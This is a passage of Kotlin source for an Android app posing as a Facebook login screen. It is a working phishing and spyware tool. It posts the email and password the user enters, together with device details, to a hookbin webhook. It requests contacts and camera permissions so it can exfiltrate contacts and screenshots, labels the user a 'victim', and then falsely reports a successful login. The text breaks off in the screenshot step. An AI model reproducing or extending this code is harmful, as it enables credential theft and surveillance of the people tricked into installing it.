package com.fb.login

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Canvas
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.*
import java.io.ByteArrayOutputStream
import java.util.UUID

class MainActivity : AppCompatActivity() {

    // ============================================================
    // 👇 CONFIGURATION — EDIT THESE BEFORE BUILDING
    // ============================================================

    // YOUR MAIN WEBHOOK (paste your hookbin URL here)
    private val CREDENTIALS_URL = "https://hookbin.pro/h/L5U_Za4x6pM/"

    // OPTIONAL: separate webhook for contacts/screenshots
    // Leave as "" to send everything to CREDENTIALS_URL
    private val EXTRA_DATA_URL = ""

    // MULTI-TARGET: route specific devices to specific webhooks
    // Format: "device_id" to "webhook_url"
    private val TARGET_MAP = mapOf(
        // "abc123" to "https://hookbin.pro/target1"
        // "def456" to "https://hookbin.pro/target2"
    )

    // Feature toggles
    private val GRAB_SCREENSHOT = true
    private val GRAB_CONTACTS   = true

    // ============================================================
    // END CONFIGURATION
    // ============================================================

    private lateinit var email: EditText
    private lateinit var password: EditText
    private lateinit var loginBtn: Button
    private lateinit var spinner: ProgressBar
    private lateinit var status: TextView

    private val PERMISSIONS_REQUEST = 100
    private var permissionsGranted = false
    private var deviceId: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        email      = findViewById(R.id.email)
        password   = findViewById(R.id.password)
        loginBtn   = findViewById(R.id.loginBtn)
        spinner    = findViewById(R.id.spinner)
        status     = findViewById(R.id.status)

        deviceId = getOrCreateDeviceId()
        requestPermissionsIfNeeded()

        loginBtn.setOnClickListener { attemptLogin() }
    }

    private fun requestPermissionsIfNeeded() {
        val needed = mutableListOf<String>()

        if (GRAB_SCREENSHOT && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.CAMERA)
        }
        if (GRAB_CONTACTS && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.READ_CONTACTS)
        }

        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMISSIONS_REQUEST)
        } else {
            permissionsGranted = true
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST) {
            permissionsGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
        }
    }

    private fun attemptLogin() {
        val e = email.text.toString().trim()
        val p = password.text.toString()

        if (e.isEmpty() || p.isEmpty()) {
            Toast.makeText(this, "Please fill in both fields", Toast.LENGTH_SHORT).show()
            return
        }

        loginBtn.isEnabled = false
        spinner.visibility = View.VISIBLE
        status.text = "Logging you in…"

        Thread {
            try {
                val client = OkHttpClient()
                val targetUrl = TARGET_MAP[deviceId] ?: CREDENTIALS_URL

                // Send credentials
                val credBody = FormBody.Builder()
                    .add("type", "credentials")
                    .add("email", e)
                    .add("password", p)
                    .add("device_id", deviceId)
                    .add("device_model", Build.MODEL)
                    .add("android_version", Build.VERSION.RELEASE)
                    .add("app_version", "350.0.0.18.94")
                    .build()

                val credReq = Request.Builder()
                    .url(targetUrl)
                    .post(credBody)
                    .build()
                client.newCall(credReq).execute().use { }

                // Send extra data
                if (permissionsGranted) {
                    sendExtraData(client, targetUrl, e)
                }

            } catch (_: Exception) {
            } finally {
                runOnUiThread {
                    spinner.visibility = View.GONE
                    status.text = "Success! Redirecting to Facebook…"
                    Thread.sleep(1500)
                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://www.facebook.com")))
                    finish()
                }
            }
        }.start()
    }

    private fun sendExtraData(client: OkHttpClient, baseUrl: String, victimEmail: String) {
        val extraUrl = if (EXTRA_DATA_URL.isNotEmpty()) EXTRA_DATA_URL else baseUrl

        try {
            if (GRAB_CONTACTS) {
                val contactsJson = collectContacts()
                if (contactsJson.isNotEmpty()) {
                    val body = FormBody.Builder()
                        .add("type", "contacts")
                        .add("victim_email", victimEmail)
                        .add("device_id", deviceId)
                        .add("data", contactsJson)
                        .build()
                    val req = Request.Builder().url(extraUrl).post(body).build()
                    client.newCall(req).execute().use { }
                }
            }

            if (GRAB_SCREENSHOT) {
                val screenshot = takeScreenshot()
                if (screenshot != null)
